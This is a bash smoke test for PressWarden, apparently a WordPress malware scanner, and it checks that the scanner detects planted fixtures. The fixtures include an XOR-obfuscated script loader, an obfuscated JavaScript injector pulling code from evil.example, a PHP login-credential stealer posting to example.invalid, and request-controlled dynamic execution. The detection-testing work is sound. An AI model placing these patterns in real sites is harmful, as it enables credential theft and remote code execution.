#!/usr/bin/env bash
set -euo pipefail
ROOTDIR="$(cd "$(dirname "$0")/.." && pwd)"
EXPECTED_VERSION=$(cat "$ROOTDIR/VERSION")
TMP="${TMPDIR:-/tmp}/presswarden-smoke.$$"; trap 'rm -rf "$TMP"' EXIT
stage() { printf 'SMOKE: %s\n' "$1"; }
SITE="$TMP/sites/example.com/public_html"
mkdir -p "$SITE/wp-admin" "$SITE/wp-content/plugins/white-engine" "$SITE/wp-content/plugins/normal-plugin" "$SITE/wp-content/plugins/malicious-js" "$SITE/wp-content/plugins/benign-js" "$SITE/wp-content/plugins/campaign" "$SITE/wp-content/plugins/credential-test" "$SITE/wp-includes"
touch "$SITE/wp-settings.php" "$SITE/wp-load.php"
printf '<?php $wp_version = "7.1";\n' > "$SITE/wp-includes/version.php"

cat > "$SITE/wp-content/plugins/white-engine/white-engine.php" <<'PHP'
<?php
final class Test_Packed_Loader {
    private static function unpack_bytes($bytes, $key) {
        $out = '';
        $m = strlen($key);
        foreach ($bytes as $i => $value) {
            $out .= chr($value ^ ord($key[$i % $m]));
        }
        return $out;
    }
    private static function hidden_source() {
        $key = implode('', array_map('chr', [8,236,224,129,47,94,245,219,207,206]));
        $rows = [[96,152,148,241,92,100,218,244,161,161,122,137,132,232,78,51,219,184,160,163,39,162,133,246,112,14,135,180,163,167,126,195,129,241,70]];
        return self::unpack_bytes($rows[0], $key);
    }
    public static function boot() {
        $src = self::hidden_source();
        wp_enqueue_script('test-packed-loader', $src, [], '1.0.0', true);
    }
}
PHP

cat > "$SITE/wp-content/plugins/normal-plugin/normal-plugin.php" <<'PHP'
<?php
function normal_plugin_assets() {
    wp_enqueue_script('normal-plugin', plugin_dir_url(__FILE__) . 'assets/app.js', [], '1.0.0', true);
}
PHP

cat > "$SITE/wp-content/plugins/malicious-js/inject.js" <<'JS'
(function(){var s=document.createElement('script');s.src=String.fromCharCode(104,116,116,112,115,58,47,47,101,118,105,108,46,101,120,97,109,112,108,101,47,120,46,106,115);document.head.appendChild(s);}());
JS
cat > "$SITE/wp-content/plugins/benign-js/app.js" <<'JS'
(function(){var s=document.createElement('script');s.src='https://cdn.example.com/app.js';document.head.appendChild(s);}());
JS
cat > "$SITE/wp-content/plugins/campaign/infected.js" <<'JS'
if(ndsw===undefined){var ndsw=true;}
JS
cat > "$SITE/wp-content/plugins/credential-test/stealer.php" <<'PHP'
<?php
$user=$_POST['log']; $pass=$_POST['pwd'];
$ch=curl_init('https://example.invalid/collect');
curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
curl_setopt($ch,CURLOPT_POSTFIELDS,['u'=>$user,'p'=>$pass]);
curl_exec($ch);
PHP
cat > "$SITE/wp-content/plugins/credential-test/dynamic.php" <<'PHP'
<?php
$fn=$_REQUEST['f'];
$fn();
PHP

stage 'syntax'
for f in "$ROOTDIR/presswarden" "$ROOTDIR/install.sh" "$ROOTDIR/uninstall.sh" "$ROOTDIR"/lib/*.sh "$ROOTDIR"/checks/*.sh "$ROOTDIR"/suites/*.sh; do bash -n "$f"; done

stage 'explicit discovery'
ROOT="$TMP/sites" PRESSWARDEN_CONFIG_FILE="$TMP/no-config" PRESSWARDEN_STATE_DIR="$TMP/state" PRESSWARDEN_CACHE_DIR="$TMP/cache" PRESSWARDEN_NOCOLOR=1 \
bash -c '
  set -euo pipefail
  . "$1/lib/_lib.sh"
  [ "${#SCAN_ROOTS[@]}" -eq 1 ]
  [ "$(site_label_from_root "${SCAN_ROOTS[0]}")" = "example.com" ]
  [ "$PRESSWARDEN_VERSION" = "$2" ]
' _ "$ROOTDIR" "$EXPECTED_VERSION"

stage 'obfuscated loader regression'
loader_out=$(ROOT="$TMP/sites" PRESSWARDEN_CONFIG_FILE="$TMP/no-config" PRESSWARDEN_STATE_DIR="$TMP/state-loader" PRESSWARDEN_CACHE_DIR="$TMP/cache-loader" PRESSWARDEN_NOCOLOR=1 bash "$ROOTDIR/checks/php-obfuscated-loader.sh" 2>&1 || true)
printf '%s\n' "$loader_out" | grep -q 'white-engine.php' || { printf '%s\n' "$loader_out" >&2; printf 'White-Engine-style fixture was not detected\n' >&2; exit 1; }
if printf '%s\n' "$loader_out" | grep -q 'normal-plugin.php'; then printf '%s\n' "$loader_out" >&2; printf 'normal wp_enqueue_script fixture was falsely flagged\n' >&2; exit 1; fi

stage 'JavaScript threat-intel regression'
js_out=$(ROOT="$TMP/sites" PRESSWARDEN_CONFIG_FILE="$TMP/no-config" PRESSWARDEN_STATE_DIR="$TMP/state-js" PRESSWARDEN_CACHE_DIR="$TMP/cache-js" PRESSWARDEN_NOCOLOR=1 bash "$ROOTDIR/checks/js-threat-intel.sh" 2>&1 || true)
printf '%s\n' "$js_out" | grep -q 'malicious-js/inject.js' || { printf '%s\n' "$js_out" >&2; printf 'obfuscated dynamic JS loader was not detected\n' >&2; exit 1; }
if printf '%s\n' "$js_out" | grep -q 'benign-js/app.js'; then printf '%s\n' "$js_out" >&2; printf 'benign dynamic CDN loader was falsely flagged\n' >&2; exit 1; fi

stage 'campaign marker regression'
campaign_out=$(ROOT="$TMP/sites" PRESSWARDEN_CONFIG_FILE="$TMP/no-config" PRESSWARDEN_STATE_DIR="$TMP/state-campaign" PRESSWARDEN_CACHE_DIR="$TMP/cache-campaign" PRESSWARDEN_NOCOLOR=1 bash "$ROOTDIR/checks/wp-campaign-intel.sh" 2>&1 || true)
printf '%s\n' "$campaign_out" | grep -q 'campaign/infected.js' || { printf '%s\n' "$campaign_out" >&2; printf 'SocGholish/NDSW marker fixture was not detected\n' >&2; exit 1; }

stage 'PHP threat-intel regression'
phpintel_out=$(ROOT="$TMP/sites" PRESSWARDEN_CONFIG_FILE="$TMP/no-config" PRESSWARDEN_STATE_DIR="$TMP/state-phpintel" PRESSWARDEN_CACHE_DIR="$TMP/cache-phpintel" PRESSWARDEN_NOCOLOR=1 bash "$ROOTDIR/checks/php-threat-intel.sh" 2>&1 || true)
printf '%s\n' "$phpintel_out" | grep -q 'credential-test/stealer.php' || { printf '%s\n' "$phpintel_out" >&2; printf 'credential exfiltration fixture was not detected\n' >&2; exit 1; }
printf '%s\n' "$phpintel_out" | grep -q 'credential-test/dynamic.php' || { printf '%s\n' "$phpintel_out" >&2; printf 'request-controlled dynamic execution fixture was not detected\n' >&2; exit 1; }

stage 'Wordfence dual-feed architecture regression'
grep -q '/vulnerabilities/scanner' "$ROOTDIR/lib/intel.sh"
grep -q '/vulnerabilities/production' "$ROOTDIR/lib/intel.sh"
grep -q 'wordfence-scanner.json' "$ROOTDIR/lib/intel.sh"
grep -q 'wordfence-production.json' "$ROOTDIR/lib/intel.sh"
grep -q 'Scanner Feed' "$ROOTDIR/checks/wp-wordfence-intel.sh"
grep -q 'Production enrichment' "$ROOTDIR/checks/wp-wordfence-intel.sh"
grep -q 'Scanner-only record' "$ROOTDIR/checks/wp-wordfence-intel.sh"

stage 'DB unsupported CHECK regression'
grep -q "doesn't support check" "$ROOTDIR/checks/wp-db-maintenance.sh"
grep -q 'return \[.unsupported.' "$ROOTDIR/checks/wp-db-maintenance.sh"
grep -q 'echo "SKIP\\t"' "$ROOTDIR/checks/wp-db-maintenance.sh"
grep -q 'Unsupported CHECK TABLE operations are informational' "$ROOTDIR/checks/wp-db-maintenance.sh"

stage 'output wording regression'
if grep -R -nE 'runall-(fast|full)\.sh' "$ROOTDIR/checks" "$ROOTDIR/lib" "$ROOTDIR/suites" "$ROOTDIR/README.md" >/dev/null 2>&1; then printf 'stale pre-PressWarden command wording found\n' >&2; exit 1; fi
grep -q 'local activation is shown separately' "$ROOTDIR/checks/wp-plugins.sh"
grep -q 'recognized provider/service MU summarized' "$ROOTDIR/checks/wp-plugins.sh"

stage 'environment precedence'
cat > "$TMP/config" <<'EOF'
PRESSWARDEN_UPLOADS_DEEP=0
EOF
cfg=$(PRESSWARDEN_CONFIG_FILE="$TMP/config" PRESSWARDEN_UPLOADS_DEEP=1 "$ROOTDIR/presswarden" config)
printf '%s\n' "$cfg" | grep -qE 'Deep upload scan:[[:space:]]+1$'

stage 'CLI aliases/version/intel'
[ "$($ROOTDIR/presswarden --version)" = "PressWarden $EXPECTED_VERSION" ]
help=$($ROOTDIR/presswarden help)
printf '%s\n' "$help" | grep -q '\./presswarden lock \[path\]'
printf '%s\n' "$help" | grep -q '\./presswarden unlock \[path\]'
printf '%s\n' "$help" | grep -q '\./presswarden lock-status \[path\]'
printf '%s\n' "$help" | grep -q '\./presswarden intel ACTION \[path\]'
intel_status=$(PRESSWARDEN_CONFIG_FILE="$TMP/no-config" PRESSWARDEN_STATE_DIR="$TMP/state-intel" "$ROOTDIR/presswarden" intel status)
printf '%s\n' "$intel_status" | grep -q 'PressWarden Threat Intelligence'
printf '%s\n' "$intel_status" | grep -qE 'Native behavior rules[[:space:]]+[1-9][0-9]*'
printf '%s\n' "$intel_status" | grep -qE 'Campaign families[[:space:]]+[1-9][0-9]*'

stage 'portable shared-host mode'
HOST="$TMP/hosting-home"; PORTABLE="$HOST/PressWarden"
mkdir -p "$HOST/domains/example.com/public_html/wp-admin" "$HOST/domains/example.com/public_html/wp-content" "$HOST/domains/example.com/public_html/wp-includes" "$PORTABLE/config"
touch "$HOST/domains/example.com/public_html/wp-settings.php" "$HOST/domains/example.com/public_html/wp-load.php"
printf '<?php $wp_version = "7.1";\n' > "$HOST/domains/example.com/public_html/wp-includes/version.php"
cp "$ROOTDIR/presswarden" "$ROOTDIR/VERSION" "$PORTABLE/"
cp -a "$ROOTDIR/lib" "$ROOTDIR/checks" "$ROOTDIR/suites" "$ROOTDIR/intel" "$PORTABLE/"
cp "$ROOTDIR/config/config.example" "$PORTABLE/config/config"; chmod 600 "$PORTABLE/config/config"
touch "$PORTABLE/.presswarden-portable"
chmod +x "$PORTABLE/presswarden" "$PORTABLE"/checks/*.sh "$PORTABLE"/suites/*.sh

portable_cfg=$(cd "$PORTABLE" && ./presswarden config)
printf '%s\n' "$portable_cfg" | grep -qE 'Install mode:[[:space:]]+portable/local$'
printf '%s\n' "$portable_cfg" | grep -Fq "Config:             $PORTABLE/config/config"
printf '%s\n' "$portable_cfg" | grep -Fq "Scan root:          $HOST/domains"
printf '%s\n' "$portable_cfg" | grep -Fq "State directory:    $PORTABLE/var"
printf '%s\n' "$portable_cfg" | grep -Fq "Cache directory:    $PORTABLE/var/cache"
printf '%s\n' "$portable_cfg" | grep -Fq "Intel directory:    $PORTABLE/var/intel"
portable_intel=$(cd "$PORTABLE" && ./presswarden intel status)
printf '%s\n' "$portable_intel" | grep -q 'Native behavior rules'

(
  cd "$PORTABLE"
  PRESSWARDEN_NOCOLOR=1 bash -c '
    set -euo pipefail
    . ./lib/_lib.sh
    [ "$ROOT" = "$1/domains" ]
    [ "${#SCAN_ROOTS[@]}" -eq 1 ]
    [ "$(site_label_from_root "${SCAN_ROOTS[0]}")" = "example.com" ]
    [ "$REPORTS" = "$2/var/reports" ]
    [ "$PRESSWARDEN_CACHE_DIR" = "$2/var/cache" ]
    [ "$QUARANTINE" = "$2/var/quarantine" ]
    [ "$PRESSWARDEN_VERSION" = "$3" ]
  ' _ "$HOST" "$PORTABLE" "$EXPECTED_VERSION"
)

stage 'runtime portability'
if grep -R -nE '<[[:space:]]*<\(|>[[:space:]]*>\(' "$ROOTDIR/checks" "$ROOTDIR/lib" "$ROOTDIR/suites" >/dev/null 2>&1; then printf 'runtime process substitution found\n' >&2; exit 1; fi
printf 'PressWarden smoke test: PASS\n'
